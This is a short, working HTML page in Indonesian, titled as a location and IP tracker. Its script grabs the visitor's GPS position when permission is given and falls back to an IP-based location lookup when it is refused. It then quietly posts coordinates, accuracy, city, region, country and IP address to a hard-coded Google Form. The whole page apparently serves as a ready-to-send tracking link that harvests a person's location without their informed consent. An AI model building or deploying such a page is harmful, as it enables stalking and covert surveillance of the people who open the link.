<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <title>Tracker Lokasi + IP (Final)</title>
</head>
<body>
  <h2>Sedang merekam lokasiâ€¦</h2>
  <script>
    const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
    const F = {
      lat:  'entry.336954328',
      long: 'entry.122334606',
      acc:  'entry.1466949585',
      city: 'entry.1958665783',
      reg:  'entry.1713030934',
      id:   'entry.2142024660',
      ip:   'entry.1095561107'
    };

    function submit(params) {
      new Image().src = FORM_URL + '?' + new URLSearchParams(params);
    }

    function record(pos) {
      fetch('https://ipwho.is/json/')
        .then(r => r.json())
        .then(d => {
          const ip      = d.ip;
          const lat     = pos?.coords ? pos.coords.latitude  : d.latitude;
          const lon     = pos?.coords ? pos.coords.longitude : d.longitude;
          const acc     = pos?.coords ? pos.coords.accuracy  : 'IP';
          const city    = d.city;
          const region  = d.region;
          const country = d.country;
          submit({
            [F.lat]:  lat,
            [F.long]: lon,
            [F.acc]:  acc,
            [F.city]: city,
            [F.reg]:  region,
            [F.id]:   country,
            [F.ip]:   ip
          });
        })
        .catch(() => {
          // Kalau ipwho.is gagal, fallback ambil IP saja via ipify
          fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(j => {
              const ip = j.ip;
              const lat = pos?.coords ? pos.coords.latitude  : '';
              const lon = pos?.coords ? pos.coords.longitude : '';
              const acc = pos?.coords ? pos.coords.accuracy  : 'unknown';
              submit({
                [F.lat]:  lat,
                [F.long]: lon,
                [F.acc]:  acc,
                [F.ip]:   ip
              });
            })
            .catch(() => {
              // Jika benar-benar gagal, kirim minimal saja
              const lat = pos?.coords ? pos.coords.latitude  : '';
              const lon = pos?.coords ? pos.coords.longitude : '';
              const acc = pos?.coords ? pos.coords.accuracy  : 'error';
              submit({
                [F.lat]:  lat,
                [F.long]: lon,
                [F.acc]:  acc,
                [F.ip]:   'unknown'
              });
            });
        });
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => record(pos),   // user Allow
        _err => record(null), // user Deny / timeout
        { timeout: 8000 }
      );
    } else {
      record(null);         // browser tak support
    }
  </script>
</body>
</html>
